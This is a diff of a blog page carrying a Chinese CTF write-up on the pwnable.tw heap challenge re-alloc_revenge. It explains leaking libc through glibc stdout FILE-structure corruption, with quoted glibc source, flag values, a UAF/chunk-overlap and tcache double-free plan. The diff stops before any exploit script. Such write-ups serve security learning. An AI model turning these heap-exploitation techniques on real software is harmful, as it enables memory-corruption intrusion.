@@ -1,340 +1,56 @@
-<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>pwn heap: re-alloc_revenge | Nop</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop" type="application/atom+xml">
-</head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">Nop</a></h1></div><p class="m-desc">There is a long way to go</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">Archives</a></li><li><span class="dot">●</span><a href="/categories/">Categories</a></li><li><span class="dot">●</span><a href="/tags/">Tags</a></li><li><span class="dot">●</span><a href="/about/">About</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="Search" onfocus="if(this.value=='Search'){this.value='';}" onblur="if(this.value==''){this.value='Search';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">pwn heap: re-alloc_revenge</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/03/18/pwn-heap-re-alloc-revenge/">2020-03-18</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/Writeup/">Writeup</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>和re-alloc一样，只不过开了PIE和RELRO，got表改不了了，要利用stdout结构体来leak libc，因为第一次做，而且过程稍微有些复杂，所以记录一下。</p>
-<blockquote>
-<p>题目描述</p>
-</blockquote>
-<p>pwnable.tw上的一道题，也就是在re-alloc上保护全开。</p>
-<pre><code>Arch:     amd64-64-little
-RELRO:    Full RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      PIE enabled
-FORTIFY:  Enabled</code></pre><p>功能就不赘述了，因为binary和re-alloc一摸一样。</p>
-<blockquote>
-<p>相关知识点</p>
-</blockquote>
-<h2 id="利用stdout结构体leak-libc"><a href="#利用stdout结构体leak-libc" class="headerlink" title="利用stdout结构体leak libc"></a>利用stdout结构体leak libc</h2><p>当binary使用过puts函数时，会依照以下调用链调用到<code>_IO_new_file_overflow</code>:</p>
-<pre><code class="C">_IO_puts --&gt; _IO_sputn --&gt; _IO_new_file_xsputn --&gt; _IO_new_file_overflow </code></pre>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="pwn heap: re-alloc_revenge"><meta name="keywords" content="pwnable.tw,pwn,re-alloc_revenge"><meta name="author" content="Nop"><meta name="copyright" content="Nop"><title>pwn heap: re-alloc_revenge | Nop's BLog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop's BLog" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#题目描述"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#相关知识点"><span class="toc-number">2.</span> <span class="toc-text">相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用stdout结构体leak-libc"><span class="toc-number">2.1.</span> <span class="toc-text">利用stdout结构体leak libc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用思路"><span class="toc-number">3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-number">5.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Nop</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">9</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">4</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">3</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/avatar.png# false or url of img)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Nop's BLog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/atom.xml">RSS</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">pwn heap: re-alloc_revenge</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-18</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">2.5k</span><span class="post-meta__separator">|</span><span>Reading time: 11 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>和re-alloc一样，只不过开了PIE和RELRO，got表改不了了，要利用stdout结构体来leak libc，因为第一次做，而且过程稍微有些复杂，所以记录一下。</p>
+<a id="more"></a>
+
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>pwnable.tw上的一道题，也就是在re-alloc上保护全开。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>功能就不赘述了，因为binary和re-alloc一摸一样。</p>
+<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="利用stdout结构体leak-libc"><a href="#利用stdout结构体leak-libc" class="headerlink" title="利用stdout结构体leak libc"></a>利用stdout结构体leak libc</h2><p>当binary使用过puts函数时，会依照以下调用链调用到<code>_IO_new_file_overflow</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_puts --&gt; _IO_sputn --&gt; _IO_new_file_xsputn --&gt; _IO_new_file_overflow</span><br></pre></td></tr></table></figure>
 <p>分析<code>_IO_new_file_overflow</code>源码：</p>
-<pre><code class="C">int _IO_new_file_overflow (FILE *f, int ch)
-{
-    // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_NO_WRITES&quot;
-    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */
-    {
-        f-&gt;_flags |= _IO_ERR_SEEN;
-        __set_errno (EBADF);
-        return EOF;
-    }   
-    // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_CURRENTLY_PUTTING&quot;
-    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)
-    {
-        /* Allocate a buffer if needed. */
-        if (f-&gt;_IO_write_base == NULL)
-        {
-            _IO_doallocbuf (f);
-            _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);
-        }
-
-        if (__glibc_unlikely (_IO_in_backup (f)))
-        {
-            size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;
-            _IO_free_backup_area (f);
-            f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base);
-            f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;
-        }
-
-        if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)
-            f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;
-        f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;
-        f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;
-        f-&gt;_IO_write_end = f-&gt;_IO_buf_end;
-        f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;
-
-        f-&gt;_flags |= _IO_CURRENTLY_PUTTING;
-        if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))
-            f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;
-    }
-    if (ch == EOF)
-        // 需要调用的目标&quot;_IO_do_write&quot;，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处
-        // 存在有价值的地址 （libc 地址）则可进行泄露
-        // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写(覆盖&quot;_IO_write_base&quot;低字节为&quot;\x00&quot;)
-        return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);
-    if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */
-        if (_IO_do_flush (f) == EOF)
-            return EOF;
-    *f-&gt;_IO_write_ptr++ = ch;
-    if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#39;\n&#39;))
-        if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) 
-            return EOF;
-    return (unsigned char) ch;
-}</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 跳过这个if分支，需要设置"fp-&gt;_flags | _IO_NO_WRITES"</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="comment">// 跳过这个if分支，需要设置"fp-&gt;_flags | _IO_CURRENTLY_PUTTING"</span></span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">            _IO_doallocbuf (f);</span><br><span class="line">            _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	    &#123;</span><br><span class="line">            <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">            _IO_free_backup_area (f);</span><br><span class="line">            f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">            f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">            f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">        f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">        f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">        f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">            f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">        <span class="comment">// 需要调用的目标"_IO_do_write"，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">        <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">        <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写(覆盖"_IO_write_base"低字节为"\x00")</span></span><br><span class="line">        <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">        <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">    *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">        <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) </span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在<code>_IO_new_file_overflow</code>中，我们要利用的就是其中的<code>_IO_do_write</code>。<br><br>在输出时，如果具有缓冲区，会输出<code>_IO_write_base</code>开始的缓冲区内容，直到<code>_IO_write_ptr</code>（也就是将<code>_IO_write_base</code>一直到<code>_IO_write_ptr</code>部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是libc中），但是在<code>setbuf</code>后，理论上会不使用缓冲区。然而如果能够修改<code>_IO_2_1_stdout_</code>结构体的<code>flags</code>部分，使得其认为<code>stdout</code>具有缓冲区，再将<code>_IO_write_base</code>处的值进行<code>partial overwrite</code>，就可以泄露出libc地址了。<br><br>为了设置对应的<code>flags</code>的值，需要进一步分析<code>_IO_do_write</code>(其实就是<code>_IO_new_do_write</code>)：</p>
-<pre><code class="C">int _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
-{
-    return (to_do == 0 || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
-}
-
-static size_t new_do_write (FILE *fp, const char *data, size_t to_do)
-{
-    size_t count;
-    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)
-        fp-&gt;_offset = _IO_pos_BAD;
-    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)
-    {
-        // &quot;_IO_SYSSEEK&quot;只是简单的调用lseek，但是我们不能完全控制&quot;fp-&gt;_IO_write_base - fp-&gt;_IO_read_end&quot;的值。
-        // 如果&quot;fp-&gt;_IO_read_end&quot;的值设置为0，那么&quot;_IO_SYSSEEK&quot;的第二个参数值就会过大;
-        // 如果设置&quot;fp-&gt;_IO_write_base = fp-&gt;_IO_read_end&quot;的话，那么在其它地方就会有问题，因为&quot;fp-&gt;_IO_write_base&quot;不能大于&quot;fp-&gt;_IO_write_end&quot;。
-        // 所以这里要设置&quot;fp-&gt;_flags | _IO_IS_APPENDING&quot;，避免进入else if分支。
-        off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);
-        if (new_pos == _IO_pos_BAD)
-            return 0;
-        fp-&gt;_offset = new_pos;
-    }
-    // 需要的目标&quot;_IO_SYSWRITE&quot;
-    count = _IO_SYSWRITE (fp, data, to_do);
-    if (fp-&gt;_cur_column &amp;&amp; count)
-        fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;
-    _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);
-    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;
-    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);
-    return count;
-}</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (to_do == <span class="number">0</span> || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> size_t <span class="title">new_do_write</span> <span class="params">(FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// "_IO_SYSSEEK"只是简单的调用lseek，但是我们不能完全控制"fp-&gt;_IO_write_base - fp-&gt;_IO_read_end"的值。</span></span><br><span class="line">        <span class="comment">// 如果"fp-&gt;_IO_read_end"的值设置为0，那么"_IO_SYSSEEK"的第二个参数值就会过大;</span></span><br><span class="line">        <span class="comment">// 如果设置"fp-&gt;_IO_write_base = fp-&gt;_IO_read_end"的话，那么在其它地方就会有问题，因为"fp-&gt;_IO_write_base"不能大于"fp-&gt;_IO_write_end"。</span></span><br><span class="line">        <span class="comment">// 所以这里要设置"fp-&gt;_flags | _IO_IS_APPENDING"，避免进入else if分支。</span></span><br><span class="line">        <span class="keyword">off64_t</span> new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 需要的目标"_IO_SYSWRITE"</span></span><br><span class="line">    count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">        fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>综上可以得到，<code>flags</code>需要满足的条件为：</p>
-<pre><code class="C">_flags = 0xfbad0000                 // Magic number
-_flags &amp; = ~_IO_NO_WRITES           // _flags = 0xfbad0000
-_flags | = _IO_CURRENTLY_PUTTING    // _flags = 0xfbad0800
-_flags | = _IO_IS_APPENDING         // _flags = 0xfbad1800</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>                 <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES           <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING    <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING         <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>
 <p>同时可以将<code>_IO_read_ptr</code>, <code>_IO_read_end</code>, <code>_IO_read_base</code>, <code>_IO_write_base</code>设置为：</p>
-<pre><code class="C">_IO_read_ptr = 0;
-_IO_read_end = 0;
-_IO_read_base = 0;
-_IO_write_base = 0x7fXXXXXXXX00;</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">_IO_read_end = <span class="number">0</span>;</span><br><span class="line">_IO_read_base = <span class="number">0</span>;</span><br><span class="line">_IO_write_base = <span class="number">0x7f</span>XXXXXXXX00;</span><br></pre></td></tr></table></figure>
 <p>然后就可以根据输出的数据leak出libc地址了。</p>
-<blockquote>
-<p>利用思路</p>
-</blockquote>
-<ul>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
 <li>利用<code>alloc</code>功能在<code>size=0</code>时存在的uaf，以及<code>realloc</code>中当<code>size &lt; old_size</code>而触发的<code>free(remainder)</code>操作，形成chunk overlap，然后覆盖chunk的size至足够放进unsorted bin中（这里因为要爆破而且连远程的延迟比较大，所以尽量小）。</li>
-<li>为了保证能够顺利地将chunk放进unsorted bin中，需要绕过这里的检查，也就是需要先free掉足够大小的chunk，保证该需要放进unsorted bin的nextchunk的prev_inuse area为1。由于每次分配最大的size为0x78也就是chunk的size最大为0x80，这里要进行多次的<code>alloc(0x68)</code>, <code>realloc(0x78)</code>, <code>free()</code>操作（为了防止tcache中刚被free掉的chunk又被取出来）。直到nextchunk正好指向size为0x80的fastbin。<pre><code class="C">if (__glibc_unlikely (!prev_inuse(nextchunk)))
-  malloc_printerr (&quot;double free or corruption (!prev)&quot;);</code></pre>
-</li>
-<li>此外，由于后续的操作需要保持unsorted bin中和tcache bin中同时存在该伪造的unsorted bin，从而能从该tcache中分配到位于<code>stdout</code>结构体的内存，所以要在前面提到的<code>free(remainder)</code>形成的tcache bin初形成该chunk的double free，从而在分配该处的chunk时仍能将它保留在tcache中。<pre><code>tcache bin ==&gt; +--------+ &lt;--victim_chunk                      tcache bin ==&gt; +--------+&lt;--same victim_chunk
-               |        |                   after malloc                      |        |
-               +--------+&lt;--+            ===================&gt;                 +--------+
-               |fd |    |   |                                                 |        |
-               +--------+   |                                                 +--------+
-                 |          |
-                 +----------+</code></pre></li>
+<li>为了保证能够顺利地将chunk放进unsorted bin中，需要绕过这里的检查，也就是需要先free掉足够大小的chunk，保证该需要放进unsorted bin的nextchunk的prev_inuse area为1。由于每次分配最大的size为0x78也就是chunk的size最大为0x80，这里要进行多次的<code>alloc(0x68)</code>, <code>realloc(0x78)</code>, <code>free()</code>操作（为了防止tcache中刚被free掉的chunk又被取出来）。直到nextchunk正好指向size为0x80的fastbin。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">    malloc_printerr (<span class="string">"double free or corruption (!prev)"</span>);</span><br></pre></td></tr></table></figure></li>
